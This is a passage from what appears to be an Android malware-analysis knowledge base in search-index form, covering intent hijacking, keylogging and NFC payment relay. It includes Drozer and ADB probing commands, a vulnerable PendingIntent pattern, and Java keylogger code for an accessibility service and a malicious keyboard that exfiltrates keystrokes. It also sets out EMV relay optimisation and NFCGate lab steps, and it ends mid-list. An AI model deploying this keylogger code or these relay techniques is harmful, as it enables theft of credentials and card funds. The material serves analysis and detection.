</ol>"},{"location":"attacks/intent-hijacking/#exported-component-abuse","title":"Exported Component Abuse","text":"<p>Components declared with <code>android:exported=\"true\"</code> (or with an intent filter, which implies export on API &lt; 31) can be started by any app:</p> <pre><code>Intent intent = new Intent();\nintent.setComponent(new ComponentName(\"com.target.app\", \"com.target.app.InternalActivity\"));\nstartActivity(intent);\n</code></pre> <p>This can reach activities not designed for external use: admin panels, debug screens, data viewers.</p>"},{"location":"attacks/intent-hijacking/#intent-redirection","title":"Intent Redirection","text":"<p>A more powerful variant where a vulnerable app is tricked into launching its own non-exported components on behalf of the attacker. Oversecured's systematic research found this in more than 80% of analyzed apps. The attack flow:</p> <ol> <li>Attacker sends an intent to an exported activity that accepts an \"inner intent\" parameter</li> <li>The exported activity extracts the inner intent and calls <code>startActivity()</code> with it</li> <li>Since the call originates from within the app's own process, non-exported components are reachable</li> </ol> <p>This is particularly dangerous because it grants access to content providers, WebViews, and internal activities that were never designed for external interaction. Oversecured's Samsung research used this to access system-level components on Samsung devices, and their Google apps audit found widespread intent redirection across 225 Google applications.</p>"},{"location":"attacks/intent-hijacking/#arbitrary-code-execution-via-package-contexts","title":"Arbitrary Code Execution via Package Contexts","text":"<p>Oversecured documented how Android's package context resolution can be exploited for arbitrary code execution. By manipulating how Android resolves and loads code from third-party package contexts, an attacker can execute arbitrary code within the target app's process, inheriting all its permissions and data access.</p>"},{"location":"attacks/intent-hijacking/#service-hijacking","title":"Service Hijacking","text":"<p>An implicit intent to bind a service can be intercepted by a malicious service. The malicious service then receives all IPC calls meant for the legitimate service.</p> <p>On Android 5.0+, implicit intents to services throw an exception, forcing explicit binding. This largely eliminates this variant on modern devices.</p>"},{"location":"attacks/intent-hijacking/#ordered-broadcast-interception","title":"Ordered Broadcast Interception","text":"<p>See Broadcast Theft for broadcast-specific interception.</p>"},{"location":"attacks/intent-hijacking/#real-world-impact","title":"Real-World Impact","text":"Vulnerability Type Example OAuth redirect interception Malicious app registers for the OAuth callback URI scheme, stealing authorization codes Payment intent interception Intercepting payment processing intents to redirect to attacker-controlled handlers File sharing interception Registering for <code>ACTION_SEND</code> to capture files shared between apps Deep link hijacking See Deep Link Exploitation"},{"location":"attacks/intent-hijacking/#android-version-changes","title":"Android Version Changes","text":"<p>Android 5.0 (API 21): implicit intents to services throw <code>IllegalArgumentException</code>. Must use explicit intents.</p> <p>Android 12 (API 31): components with intent filters must explicitly declare <code>android:exported=\"true\"</code> or <code>\"false\"</code>. Previously, having an intent filter implied export. This forces developers to make explicit decisions.</p> <p>Android 12+: <code>PendingIntent</code> mutability must be declared (<code>FLAG_MUTABLE</code> / <code>FLAG_IMMUTABLE</code>), reducing PendingIntent hijacking.</p>"},{"location":"attacks/intent-hijacking/#detection-during-analysis","title":"Detection During Analysis","text":"<p>Look for:</p> <ul> <li>Implicit intents sent with sensitive data in extras</li> <li>Components with <code>android:exported=\"true\"</code> that handle sensitive operations</li> <li>Activities without <code>android:permission</code> protection that accept external input</li> <li><code>PendingIntent</code> creation without <code>FLAG_IMMUTABLE</code></li> <li>Custom URI schemes without proper validation</li> <li>Activities that extract and launch \"inner intents\" from extras (intent redirection)</li> </ul> <p>Oversecured's interception of implicit intents guide provides detailed technical coverage of implicit intent resolution mechanics and exploitation patterns.</p>"},{"location":"attacks/intent-hijacking/#pending-intent-vulnerabilities","title":"Pending Intent Vulnerabilities","text":"<p>A <code>PendingIntent</code> wraps an intent and grants the recipient permission to execute it as if it came from the original sender, with the sender's identity and permissions. When a <code>PendingIntent</code> is created as mutable (<code>FLAG_MUTABLE</code>), the recipient can modify the base intent before executing it -- changing the target component, adding extras, or altering the action.</p>"},{"location":"attacks/intent-hijacking/#attack-flow","title":"Attack Flow","text":"<ol> <li>A privileged app (e.g., system service, banking app) creates a <code>PendingIntent</code> for a notification action, widget update, or <code>MediaSession</code> callback</li> <li>The <code>PendingIntent</code> is delivered to a less-privileged context -- a notification visible to all apps, a widget host, or an IPC call</li> <li>The attacker's app receives or intercepts the <code>PendingIntent</code></li> <li>If the <code>PendingIntent</code> is mutable and was created with an implicit or empty base intent, the attacker fills in or modifies the intent fields</li> <li>The attacker calls <code>PendingIntent.send()</code> with a modified intent</li> <li>Android executes the modified intent under the original sender's identity, with all of the sender's permissions</li> </ol>"},{"location":"attacks/intent-hijacking/#why-this-is-dangerous","title":"Why This Is Dangerous","text":"<p>The <code>PendingIntent</code> carries the sender's UID and permission set. When the attacker triggers it with a modified intent, the system treats it as an action by the original app. This means:</p> <ul> <li>If the sender holds <code>MANAGE_EXTERNAL_STORAGE</code>, the attacker can read/write arbitrary files</li> <li>If the sender is a system app, the attacker can launch non-exported system components</li> <li>If the sender holds <code>INTERNET</code> and the attacker doesn't, the attacker can exfiltrate data through the sender's network access</li> </ul>"},{"location":"attacks/intent-hijacking/#vulnerable-patterns","title":"Vulnerable Patterns","text":"<pre><code>PendingIntent pi = PendingIntent.getActivity(\n    context, 0, new Intent(), PendingIntent.FLAG_MUTABLE\n);\n</code></pre> <p>An empty base intent with <code>FLAG_MUTABLE</code> is the worst case. The attacker has full control over the intent that gets executed under the sender's identity.</p> <p>A safer pattern uses <code>FLAG_IMMUTABLE</code> and a fully specified explicit intent:</p> <pre><code>Intent explicit = new Intent(context, SpecificActivity.class);\nexplicit.setPackage(\"com.myapp\");\nPendingIntent pi = PendingIntent.getActivity(\n    context, 0, explicit, PendingIntent.FLAG_IMMUTABLE\n);\n</code></pre>"},{"location":"attacks/intent-hijacking/#research-references","title":"Research References","text":"<p>Oversecured's PendingIntent research documented this class of vulnerability across major Android apps, finding mutable PendingIntents with empty or implicit base intents in system components, OEM apps, and popular third-party applications. Google's own security bulletin has patched multiple PendingIntent issues in system services.</p> <p>Android 12 (API 31) requires explicit mutability declaration (<code>FLAG_MUTABLE</code> or <code>FLAG_IMMUTABLE</code>), which forces developers to consciously decide. However, apps that need mutable PendingIntents (e.g., for inline reply in notifications, <code>MediaSession</code> callbacks) remain vulnerable if the base intent is not fully specified.</p>"},{"location":"attacks/intent-hijacking/#families-using-this-technique","title":"Families Using This Technique","text":"Family Technique Target Anatsa Abuses exported activities in banking apps to launch internal transfer screens European banking apps Vultur Exploits exported components to trigger screen recording and keylogging setup Banking and crypto apps SpyNote Launches exported activities of target apps to extract stored data and credentials Enterprise and banking apps Cerberus Intercepts OAuth redirect intents by registering competing intent filters for custom URI schemes Banking apps using OAuth flows SharkBot Hijacks Automated Transfer System flows by injecting intents into banking app exported components European banking apps Joker Intercepts SMS intents and notification listeners to steal OTPs and subscription confirmations Premium SMS services"},{"location":"attacks/intent-hijacking/#testing-for-intent-vulnerabilities","title":"Testing for Intent Vulnerabilities","text":""},{"location":"attacks/intent-hijacking/#enumerating-exported-components-with-drozer","title":"Enumerating Exported Components with Drozer","text":"<p>Drozer is the standard tool for auditing Android IPC attack surfaces. Install it on a test device or emulator and connect via ADB.</p> <p>List all exported activities:</p> <pre><code>dz&gt; run app.activity.info -a com.target.app -u\n</code></pre> <p>List all exported services:</p> <pre><code>dz&gt; run app.service.info -a com.target.app -u\n</code></pre> <p>List all exported broadcast receivers:</p> <pre><code>dz&gt; run app.broadcast.info -a com.target.app -u\n</code></pre> <p>List all exported content providers:</p> <pre><code>dz&gt; run app.provider.info -a com.target.app -u\n</code></pre>"},{"location":"attacks/intent-hijacking/#testing-intent-injection","title":"Testing Intent Injection","text":"<p>Launch an exported activity with crafted extras:</p> <pre><code>dz&gt; run app.activity.start --component com.target.app com.target.app.InternalActivity \\\n    --extra string secret_data \"injected_value\"\n</code></pre> <p>Send an intent to an exported broadcast receiver:</p> <pre><code>dz&gt; run app.broadcast.send --action com.target.app.SENSITIVE_ACTION \\\n    --extra string token \"attacker_token\"\n</code></pre>"},{"location":"attacks/intent-hijacking/#checking-for-intent-redirection","title":"Checking for Intent Redirection","text":"<p>Search the decompiled source for activities that extract an intent from extras and launch it:</p> <pre><code>Intent inner = getIntent().getParcelableExtra(\"next_intent\");\nstartActivity(inner);\n</code></pre> <p>This pattern allows an attacker to send any intent as the <code>next_intent</code> extra, and the vulnerable app will launch it from its own process, reaching non-exported components.</p>"},{"location":"attacks/intent-hijacking/#pendingintent-audit","title":"PendingIntent Audit","text":"<p>Search the codebase for <code>PendingIntent</code> creation and check:</p> <ol> <li>Is <code>FLAG_MUTABLE</code> used? If so, is the base intent fully explicit (component and package set)?</li> <li>Is the base intent empty (<code>new Intent()</code>)? This is exploitable.</li> <li>Is the <code>PendingIntent</code> exposed through notifications, widgets, or IPC? These are reachable by attackers.</li> </ol>"},{"location":"attacks/intent-hijacking/#adb-based-quick-tests","title":"ADB-Based Quick Tests","text":"<p>Without Drozer, use ADB directly to probe exported components:</p> <pre><code>adb shell am start -n com.target.app/.ExportedActivity \\\n    --es sensitive_key \"test_value\"\n\nadb shell am broadcast -a com.target.app.CUSTOM_ACTION \\\n    --es data \"injected\"\n\nadb shell am startservice -n com.target.app/.ExportedService\n</code></pre> <p>If these commands successfully trigger functionality that should be internal-only, the app has an intent hijacking vulnerability.</p>"},{"location":"attacks/keylogging/","title":"Keylogging &amp; Input Capture","text":"<p>Intercepting user keystrokes and text input to steal credentials, OTPs, and sensitive data. On Android, there is no kernel-level keylogger equivalent -- input capture operates through the accessibility framework or by replacing the system keyboard with a malicious Input Method Editor (IME). Both approaches are well-documented abuse paths that require user interaction to enable.</p>"},{"location":"attacks/keylogging/#requirements","title":"Requirements","text":"Requirement Details Accessibility keylogging <code>BIND_ACCESSIBILITY_SERVICE</code> enabled by user IME keylogging Malicious IME installed and selected as default keyboard Targeted capture Package name list of target apps from C2"},{"location":"attacks/keylogging/#techniques","title":"Techniques","text":""},{"location":"attacks/keylogging/#accessibility-based-keylogging","title":"Accessibility-Based Keylogging","text":"<p>The dominant method. An enabled accessibility service receives <code>TYPE_VIEW_TEXT_CHANGED</code> events every time the user types or modifies text in any app. Each event contains the current text content, the source package name, and the view's resource ID.</p> <pre><code>@Override\npublic void onAccessibilityEvent(AccessibilityEvent event) {\n    if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {\n        CharSequence pkg = event.getPackageName();\n        List&lt;CharSequence&gt; textList = event.getText();\n        String fieldId = event.getSource() != null\n            ? event.getSource().getViewIdResourceName()\n            : \"unknown\";\n\n        String captured = \"\";\n        for (CharSequence t : textList) {\n            captured += t.toString();\n        }\n\n        if (isTargetPackage(pkg.toString())) {\n            exfiltrate(pkg.toString(), fieldId, captured);\n        }\n    }\n}\n</code></pre> <p>The accessibility service configuration in <code>res/xml/accessibility_service_config.xml</code>:</p> <pre><code>&lt;accessibility-service\n    xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    android:accessibilityEventTypes=\"typeViewTextChanged|typeViewFocused\"\n    android:accessibilityFeedbackType=\"feedbackGeneric\"\n    android:notificationTimeout=\"100\"\n    android:accessibilityFlags=\"flagRetrieveInteractiveWindows|flagRequestFilterKeyEvents\"\n    android:canRetrieveWindowContent=\"true\" /&gt;\n</code></pre> <p>The <code>flagRequestFilterKeyEvents</code> flag enables the service to receive raw <code>KeyEvent</code> objects via <code>onKeyEvent()</code>, providing individual key presses rather than accumulated text:</p> <pre><code>@Override\nprotected boolean onKeyEvent(KeyEvent event) {\n    if (event.getAction() == KeyEvent.ACTION_DOWN) {\n        int keyCode = event.getKeyCode();\n        logKeystroke(keyCode, event.getUnicodeChar());\n    }\n    return false;\n}\n</code></pre> <p>Returning <code>false</code> allows the key event to pass through to the target app normally. Returning <code>true</code> would consume it, which would alert the user.</p>"},{"location":"attacks/keylogging/#custom-ime-keylogging","title":"Custom IME Keylogging","text":"<p>A malicious <code>InputMethodService</code> replaces the device keyboard. Every keystroke across every app flows through the malware's code, including characters the user deletes before submission -- something accessibility keylogging cannot capture.</p> <pre><code>public class MaliciousIME extends InputMethodService {\n    @Override\n    public View onCreateInputView() {\n        return getLayoutInflater().inflate(R.layout.keyboard, null);\n    }\n\n    @Override\n    public void onStartInput(EditorInfo attribute, boolean restarting) {\n        super.onStartInput(attribute, restarting);\n        logTargetField(attribute.packageName, attribute.fieldId, attribute.inputType);\n    }\n\n    public void onKeyPress(int keyCode) {\n        InputConnection ic = getCurrentInputConnection();\n        if (ic != null) {\n            ic.commitText(String.valueOf((char) keyCode), 1);\n            exfiltrate(keyCode, getCurrentPackage());\n        }\n    }\n}\n</code></pre> <p>The <code>EditorInfo</code> object reveals the input field type (<code>TYPE_TEXT_VARIATION_PASSWORD</code>, <code>TYPE_CLASS_NUMBER</code> for PINs, etc.), allowing the malware to flag high-value captures automatically.</p> <p>Activation requires two steps: the user must install the IME and then select it as the default keyboard. Malware automates the second step by using accessibility to navigate Settings &gt; Language &amp; Input and toggle the keyboard selection.</p>"},{"location":"attacks/keylogging/#proc-based-monitoring-historical","title":"/proc-Based Monitoring (Historical)","text":"<p>Older technique from pre-Android 7 era. The malware reads <code>/proc/self/inputflinger</code> or parses <code>/dev/input/eventX</code> (requires root or specific SELinux context) to intercept raw input events at the Linux kernel level. Android's SELinux policies and procfs restrictions have made this approach non-viable on modern devices without a kernel exploit.</p>"},{"location":"attacks/keylogging/#accessibility-vs-ime-comparison","title":"Accessibility vs IME Comparison","text":"Aspect Accessibility Keylogging Custom IME Activation User enables accessibility service User selects as default keyboard Capture scope Text after each change event Individual keystrokes including deleted characters Password fields May receive masked text (dots) in some apps Sees raw characters before masking Package context Package name + resource ID available Package name + EditorInfo available Persistence Survives app restarts, sometimes device reboots Persists as default keyboard until changed Android restrictions Increasingly restricted per version Minimal restrictions, user choice respected Stealth No visible change to user Keyboard UI must look legitimate Additional capabilities Full accessibility suite (clicks, gestures, screen reading) Limited to input capture only Prevalence in malware Dominant approach (~90% of banking trojans) Rare, used by a few specialized families"},{"location":"attacks/keylogging/#targeted-field-capture","title":"Targeted Field Capture","text":"<p>Banking trojans do not log everything. They maintain a target list (downloaded from C2) mapping package names to fields of interest. This reduces noise and data volume.</p> Target How Identified Event Pattern Username/email Resource ID containing <code>login</code>, <code>email</code>, <code>username</code>, <code>user_id</code> <code>TYPE_VIEW_TEXT_CHANGED</code> on matching view Password <code>TYPE_TEXT_VARIATION_PASSWORD</code> input type, or resource ID containing <code>password</code>, <code>pass</code>, <code>pin</code> <code>TYPE_VIEW_TEXT_CHANGED</code> (may be masked) or <code>onKeyEvent</code> for raw keys OTP/2FA code Resource ID containing <code>otp</code>, <code>code</code>, <code>token</code>, 6-digit numeric input after SMS arrival <code>TYPE_VIEW_TEXT_CHANGED</code> on numeric field Card number <code>TYPE_CLASS_NUMBER</code> with 16-digit pattern, resource ID containing <code>card</code>, <code>pan</code> Sequential numeric input matching card format CVV 3-digit numeric field after card number entry <code>TYPE_VIEW_TEXT_CHANGED</code> on short numeric field <p>Some families also monitor <code>TYPE_VIEW_FOCUSED</code> events to detect when the user enters a login form, then activate intensive logging only for that session.</p>"},{"location":"attacks/keylogging/#android-version-restrictions","title":"Android Version Restrictions","text":"Version Change Impact Android 8 Accessibility services must declare handled event types Malware declares all types in config XML Android 11 <code>isAccessibilityTool</code> metadata for Play Store visibility Sideloaded malware unaffected Android 12 Accessibility services cannot observe password fields in some contexts Partial -- depends on app implementation Android 13 Restricted settings blocks accessibility for sideloaded apps Bypassed via session-based package installer Android 14 <code>accessibilityDataSensitive</code> attribute lets apps mark views as sensitive Only effective if target apps adopt the attribute Android 15 Expanded restricted settings enforcement Closes some session-installer bypass routes <p>The <code>accessibilityDataSensitive</code> attribute (Android 14+) is the most significant development. When an app marks an <code>EditText</code> as sensitive, accessibility services not flagged as <code>isAccessibilityTool</code> cannot read its content. Adoption is slow -- most banking apps have not yet implemented it.</p>"},{"location":"attacks/keylogging/#families-using-this-technique","title":"Families Using This Technique","text":"Family Method Specifics Cerberus Accessibility Logs all text input, filters by target package list from C2 Ermac Accessibility Keylogging module inherited from Cerberus codebase Hook Accessibility Keylogging combined with VNC for real-time credential observation SpyNote Accessibility + IME Deploys custom keyboard alongside accessibility for comprehensive capture BankBot Accessibility Early adopter of accessibility keylogging, targeted field capture Anubis Accessibility Dedicated keylogger module with per-app targeting TrickMo Accessibility Screen content capture via tree traversal, targets banking and OTP fields BlankBot Custom IME Replaces system keyboard, uses accessibility to auto-enable the IME Frogblight Custom IME Custom keyboard with accessibility-assisted activation Antidot Accessibility Keylogging with VNC-based remote access Xenomorph Accessibility Targeted keylogging as part of ATS workflow Octo Accessibility Combines keylogging with screen streaming Vultur Accessibility Keylogging alongside MediaProjection screen recording"},{"location":"attacks/keylogging/#credential-theft-workflow","title":"Credential Theft Workflow","text":"<p>Keylogging rarely operates in isolation. The typical credential theft chain:</p> <ol> <li>Target detection -- accessibility monitors <code>TYPE_WINDOW_STATE_CHANGED</code> to detect when a banking app opens</li> <li>Keylogging activation -- intensive logging begins for the target package</li> <li>Credential capture -- username and password captured via <code>TYPE_VIEW_TEXT_CHANGED</code></li> <li>OTP interception -- SMS intercepted via <code>READ_SMS</code> or notification reading, or the OTP input field is logged directly</li> <li>Exfiltration -- captured data sent to C2, tagged with package name and timestamp</li> <li>Account takeover -- attacker uses credentials on their own device, or initiates on-device fraud via ATS</li> </ol> <p>In families with VNC/remote access (Hook, Octo), the attacker may skip keylogging entirely and instead watch the victim's screen during login via screen capture, then take over the session directly.</p>"},{"location":"attacks/keylogging/#detection-during-analysis","title":"Detection During Analysis","text":""},{"location":"attacks/keylogging/#static-indicators","title":"Static Indicators","text":"<ul> <li><code>TYPE_VIEW_TEXT_CHANGED</code> in decompiled accessibility service code</li> <li><code>InputMethodService</code> subclass in the APK</li> <li><code>flagRequestFilterKeyEvents</code> in accessibility service configuration</li> <li><code>canRetrieveWindowContent=\"true\"</code> in service config</li> <li><code>EditorInfo</code> field inspection in IME code</li> <li>Network calls correlated with <code>onAccessibilityEvent</code> or <code>onKeyEvent</code> handlers</li> </ul>"},{"location":"attacks/keylogging/#dynamic-indicators","title":"Dynamic Indicators","text":"<ul> <li>Accessibility service actively receiving events from banking app packages</li> <li>Data exfiltration spikes correlating with text input activity</li> <li>Custom IME registered in <code>Settings.Secure.DEFAULT_INPUT_METHOD</code></li> <li>Outbound POST requests containing form field names and values</li> </ul>"},{"location":"attacks/keylogging/#frida-detection-script","title":"Frida Detection Script","text":"<p>Monitor accessibility keylogging in real time:</p> <pre><code>Java.perform(function() {\n    var AccessibilityEvent = Java.use(\"android.view.accessibility.AccessibilityEvent\");\n    AccessibilityEvent.getText.implementation = function() {\n        var result = this.getText();\n        var eventType = this.getEventType();\n        if (eventType === 16) {\n            console.log(\"[*] TYPE_VIEW_TEXT_CHANGED from: \" + this.getPackageName());\n            console.log(\"    Text: \" + result.toString());\n            console.log(\"    Source: \" + this.getSource());\n        }\n        return result;\n    };\n});\n</code></pre>"},{"location":"attacks/keylogging/#relationship-to-other-techniques","title":"Relationship to Other Techniques","text":"<ul> <li>Accessibility abuse is the foundation -- keylogging is one of many capabilities gained through an accessibility service</li> <li>Overlay attacks capture credentials through fake UI, while keylogging captures them from the real UI</li> <li>Screen capture provides visual observation of the same data that keylogging captures as text</li> </ul>"},{"location":"attacks/nfc-relay/","title":"NFC Relay Attacks","text":"<p>Relaying NFC (Near Field Communication) data from a victim's payment card to an attacker-controlled device for unauthorized transactions. An emerging attack category first seen in Android malware in 2024, enabling ATM cash withdrawal and POS fraud using cloned contactless card data.</p>"},{"location":"attacks/nfc-relay/#requirements","title":"Requirements","text":"Requirement Details Permission NFC access (normal permission, auto-granted) Condition Victim places physical payment card against infected device Infrastructure Second device (mule) with NFC and HCE (Host Card Emulation) near ATM or POS terminal"},{"location":"attacks/nfc-relay/#how-it-works","title":"How It Works","text":""},{"location":"attacks/nfc-relay/#attack-flow","title":"Attack Flow","text":"<ol> <li>Malware phishes the victim for their card PIN via a fake banking WebView</li> <li>Malware instructs the victim to hold their physical payment card against the phone (\"verify your card\")</li> <li>The infected device reads the card's NFC data</li> <li>Card data is relayed in real time to a mule's device via a C2 server</li> <li>The mule's device emulates the card using HCE at a physical ATM or POS terminal</li> <li>The mule enters the stolen PIN and withdraws cash or makes purchases</li> </ol> <p>The relay happens in real time. The NFC protocol has tight timing requirements, so the relay infrastructure must be low-latency.</p>"},{"location":"attacks/nfc-relay/#technical-mechanism","title":"Technical Mechanism","text":"Component Role Victim device Reads NFC tag data from the physical card using Android's NFC stack Relay server Forwards NFC APDU (Application Protocol Data Unit) commands between victim and mule devices Mule device Emulates the card using Android's Host Card Emulation (HCE) API, responding to the POS/ATM terminal as if it were the real card <p>The key insight: Android's HCE API allows any app to respond to NFC readers as if it were a contactless card. By relaying the real card's responses through a mule device, the ATM or POS terminal cannot distinguish the relay from a genuine tap.</p>"},{"location":"attacks/nfc-relay/#nfcgate","title":"NFCGate","text":"<p>NFCGate is an open-source academic NFC relay tool developed at TU Darmstadt for security research. It provides the relay infrastructure that NGate repurposed for malicious use. NFCGate itself is a legitimate research tool; the malware weaponizes its relay capability.</p>"},{"location":"attacks/nfc-relay/#families-using-this-technique","title":"Families Using This Technique","text":"Family Year Approach Target NGate 2024 NFCGate-based relay, credential phishing via WebView Czech banks, ATM withdrawal RatOn 2025 NFC relay + ATS combination, crypto wallet seed extraction Czech/Slovak banks, POS fraud GhostTap 2025 Scanner/tapper pairs, Telegram-based data exfiltration Multi-region, POS fraud SuperCard 2025 NFC relay with expanded card type support European banks <p>Zimperium identified 760+ malicious apps exploiting NFC and HCE by late 2025, with 70+ C2 servers targeting Russia, Poland, Czech Republic, Slovakia, and other European countries.</p>"},{"location":"attacks/nfc-relay/#evolution","title":"Evolution","text":"<p>NGate pioneered the approach in 2024 with a straightforward NFC relay for ATM withdrawal. RatOn evolved the technique in 2025 by combining NFC relay with ATS (Automated Transfer System) capabilities, enabling both physical card cloning and automated bank transfers from a single trojan. ESET's H2 2025 threat report documented an 87% increase in NFC threats on Android and a 35x increase in NFC-based fraud.</p>"},{"location":"attacks/nfc-relay/#practical-limitations","title":"Practical Limitations","text":"Limitation Details Physical card required Victim must physically tap their card against the infected device Real-time relay NFC protocol timing constraints require low-latency relay infrastructure Mule required An in-person accomplice must be at an ATM or POS terminal during the relay Single-use risk Some banks block cards after suspicious contactless transactions Geographic constraint Mule must be at a physical terminal; cannot be done fully remotely <p>Despite these constraints, the attack is effective because contactless payment terminals perform limited verification. The terminal trusts the HCE-emulated card as long as the relayed APDU responses are valid.</p>"},{"location":"attacks/nfc-relay/#detection-during-analysis","title":"Detection During Analysis","text":"<p>Static indicators:</p> <ul> <li><code>android.nfc</code> and <code>android.nfc.cardemulation</code> imports</li> <li><code>HostApduService</code> implementation (HCE)</li> <li><code>AID_GROUP</code> declarations in XML for payment card emulation</li> <li>WebSocket or raw TCP connections for real-time data relay</li> <li>UI strings asking user to \"tap\" or \"hold\" their card</li> </ul> <p>Dynamic indicators:</p> <ul> <li>NFC read operations followed by immediate network transmission</li> <li>HCE service activation without legitimate payment functionality</li> <li>WebView loading card PIN entry forms</li> </ul>"},{"location":"attacks/nfc-relay/#apdu-command-flow","title":"APDU Command Flow","text":"<p>NFC relay attacks work at the APDU (Application Protocol Data Unit) layer defined by ISO 7816-4. Every contactless EMV transaction follows a structured sequence of command-response pairs between the terminal and card. In a relay attack, the mule device's HCE service receives commands from the terminal and forwards them through the relay infrastructure to the victim's device, which passes them to the real card and returns the responses.</p>"},{"location":"attacks/nfc-relay/#emv-transaction-sequence","title":"EMV Transaction Sequence","text":"Step APDU Command Purpose Relayed or Cacheable 1 <code>SELECT (PPSE)</code> Terminal selects Proximity Payment Systems Environment to discover available payment apps Cacheable -- response is static per card 2 <code>SELECT (AID)</code> Terminal selects a specific payment application (e.g., Visa AID <code>A0000000031010</code>) Cacheable -- AID list doesn't change 3 <code>GET PROCESSING OPTIONS</code> Terminal sends transaction parameters (amount, currency, date); card returns Application Interchange Profile (AIP) and Application File Locator (AFL) Must relay -- card may use terminal-provided data to determine CDA/DDA mode 4 <code>READ RECORD</code> (multiple) Terminal reads card records indicated by AFL: cardholder name, PAN, expiry, certificates Cacheable -- these records are static 5 <code>GET DATA</code> Terminal requests additional data objects (e.g., ATC, log entries) Depends -- ATC (Application Transaction Counter) is dynamic 6 <code>GENERATE AC</code> Terminal requests an Application Cryptogram; card produces ARQC using its secret key, the ATC, and transaction data Must relay -- this is the dynamic cryptogram that authenticates the card <p>The critical insight for relay optimization: steps 1, 2, and 4 return static data that can be cached after the first relay session. This reduces the number of round trips needed during subsequent attacks. Steps 3 and 6 must always be relayed because they involve transaction-specific dynamic data. Step 6 is the most time-sensitive -- the terminal expects the cryptogram response within a tight window, so relay latency directly determines success or failure.</p>"},{"location":"attacks/nfc-relay/#timing-constraints","title":"Timing Constraints","text":"<p>The EMV contactless specification allows around 500ms for the full transaction. Each relay hop adds latency:</p> <ul> <li>Card-to-victim-device: near-instant (local NFC)</li> <li>Victim-device-to-relay-server: 30-100ms (network dependent)</li> <li>Relay-server-to-mule-device: 30-100ms</li> <li>Mule-device-to-terminal: near-instant (local NFC)</li> </ul> <p>A single round trip through the relay adds 60-200ms. With multiple APDU exchanges required, the total relay overhead can approach or exceed the terminal's timeout. This is why caching static responses and minimizing network hops is essential for a reliable relay.</p>"},{"location":"attacks/nfc-relay/#nfc-relay-vs-card-cloning","title":"NFC Relay vs Card Cloning","text":"Aspect NFC Relay Card Cloning Timing Real-time -- victim card must be present during the transaction Offline -- cloned data is used independently Authentication Defeats EMV dynamic authentication (ARQC cryptograms generated by the real card) Only works with static data (magstripe CVV, static CVC3) Data captured Full APDU conversation including dynamic cryptograms Card number, expiry, static authentication data Reusability Each transaction requires a new relay session Cloned data can be reused until card is blocked Complexity Requires two devices, relay infrastructure, real-time coordination Requires one device and a blank card or emulator Scope Works against modern chip-and-PIN and contactless EMV Limited to terminals that accept magstripe fallback or static contactless <p>EMV's core defense against cloning is the dynamic Application Cryptogram generated during <code>GENERATE AC</code>. The card uses a symmetric key shared only with the issuer to produce a cryptogram over the transaction data, including the unpredictable number from the terminal and the card's own transaction counter. An attacker who clones static card data cannot produce valid cryptograms for new transactions because they lack the card's secret key.</p> <p>Relay bypasses this entirely. The real card generates the cryptogram in response to the terminal's challenge, and the relay infrastructure simply forwards it. From the issuer's perspective, the cryptogram is valid because it was produced by the genuine card. The issuer has no way to know the card was physically in a different location than the terminal.</p>"},{"location":"attacks/nfc-relay/#extending-beyond-payment","title":"Extending Beyond Payment","text":"<p>NFC relay is not limited to payment cards. Any system that uses NFC challenge-response authentication is vulnerable.</p>"},{"location":"attacks/nfc-relay/#access-control-badges","title":"Access Control Badges","text":"<p>Corporate and government buildings use contactless smart cards (MIFARE DESFire, HID iCLASS SE) for physical access. The relay attack works identically: one device reads the victim's badge, relays APDU data to a second device at the door reader. The access control system sees valid credentials and unlocks. Unlike payment systems, most physical access systems have no transaction counter or backend authorization check, making relay even simpler.</p>"},{"location":"attacks/nfc-relay/#transit-cards","title":"Transit Cards","text":"<p>Closed-loop transit systems (Oyster, Clipper, OMNY) use NFC cards with stored value or account-linked identifiers. Relaying a transit card allows fare evasion by tapping the mule device at a turnstile while the victim's card is read remotely. Transit systems typically have weaker anti-relay protections than payment networks because the fraud value per transaction is low.</p>"},{"location":"attacks/nfc-relay/#digital-identity-documents","title":"Digital Identity Documents","text":"<p>ePassports and national ID cards (compliant with ICAO 9303) use NFC for machine-readable verification. The chip stores biometric data, personal details, and digital signatures. While Basic Access Control (BAC) and Password Authenticated Connection Establishment (PACE) protect against unauthorized reading, once the optical MRZ is known (or relay is initiated during a legitimate verification), the full chip contents can be relayed. This enables identity document relay during remote verification scenarios where the verifier expects physical document presence.</p>"},{"location":"attacks/nfc-relay/#hotel-key-cards","title":"Hotel Key Cards","text":"<p>Many modern hotel systems use NFC-based room keys issued to guests' phones or physical cards. These typically use static or weakly dynamic authentication, making them straightforward relay targets. The mule device can open doors while the victim's key is read at a different location.</p>"},{"location":"attacks/nfc-relay/#building-a-test-lab","title":"Building a Test Lab","text":"<p>Testing NFC relay detection requires a controlled environment that replicates the attack chain.</p>"},{"location":"attacks/nfc-relay/#hardware","title":"Hardware","text":"Component Purpose Notes Android device #1 (reader) Reads the target NFC card Must support NFC; acts as the \"victim-side\" relay endpoint Android device #2 (emulator) Emulates the card at a terminal using HCE Must support HCE; acts as the \"mule-side\" relay endpoint Contactless test card EMV test card from a payment card test kit or expired contactless card Do not use live payment cards for testing NFC-capable POS terminal (optional) Validates end-to-end relay against a real reader Test terminals available from payment processor dev programs"},{"location":"attacks/nfc-relay/#software","title":"Software","text":"Tool Purpose NFCGate Open-source NFC relay framework from TU Darmstadt; supports on-device relay mode and server relay mode Frida Hook Android NFC stack (<code>android.nfc.tech.IsoDep</code>) to log APDU commands during relay Wireshark + USBPcap Capture NFC traffic when using USB-connected NFC readers nfcpy (Python) Scriptable NFC library for crafting custom APDU sequences on a desktop with an ACR122U reader"},{"location":"attacks/nfc-relay/#setup-steps","title":"Setup Steps","text":"<ol> <li>Install NFCGate on both Android devices from the GitHub releases (requires root for on-device relay mode, though server relay mode works without root on some builds)</li> <li>Configure one device as \"reader\" mode and the other as \"relay\" mode</li> <li>Set the relay server address -- NFCGate supports direct device-to-device relay over a network or through an intermediary server</li> <li>Place the test card against the reader device</li> <li>Hold the emulator device against a POS terminal or use a desktop NFC reader with nfcpy to simulate terminal commands</li> <li>Observe the relayed APDU traffic in NFCGate's log view</li> <li>Measure round-trip latency per APDU exchange to determine relay viability under EMV timing constraints</li> </ol>"},{"location":"attacks/nfc-relay/#what-to-test","title":"What to Test","text":"<ul> <li>Relay latency: measure whether the full EMV transaction completes within the terminal's timeout window</li> <li>Selective caching: verify which APDU responses can be cached without breaking the transaction</li> <li>Distance limits: test maximum practical distance between reader and emulator (network-limited, not NFC-limited)</li> <li>Detection 